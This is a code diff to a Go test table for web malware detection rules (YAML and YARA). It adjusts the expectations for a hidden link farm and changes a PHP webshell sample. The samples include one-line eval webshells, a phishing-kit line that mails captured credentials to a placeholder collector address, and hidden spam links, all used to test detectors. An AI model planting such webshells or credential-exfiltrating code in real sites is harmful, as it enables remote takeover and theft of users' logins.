@@ -1693,14 +1693,16 @@ eval($_POST['c']);`,
 			wantYARAHit: true,
 		},
 		{
+			// A link farm is a link farm whatever element hides it; pinning the
+			// rules to div would write a blind spot into the test.
 			name:     "hidden non-div link collection",
 			yamlRule: "spam_hidden_div_links",
 			yaraRule: "spam_hidden_links",
 			ext:      ".html",
 			sample: `<section style="display:none">` + strings.Repeat(
 				`<a href="https://cheap-pills.example.test/">buy</a>`, 8) + `</section>`,
-			wantYAMLHit: false,
-			wantYARAHit: false,
+			wantYAMLHit: true,
+			wantYARAHit: true,
 		},
 		{
 			name:     "OneDrive kit posting off-site with script",
@@ -1758,7 +1760,7 @@ mail('drop@collector.example.test', 'result', "$e|$p");`,
 			yamlRule:    "webshell_generic_eval_request",
 			yaraRule:    "webshell_generic_passthru",
 			ext:         ".php",
-			sample:      `<?php $x = $_REQUEST['code']; eval($x);`,
+			sample:      `<?php $x = $_REQUEST['a']; eval($x);`,
 			wantYAMLHit: true,
 			wantYARAHit: true,
 		},
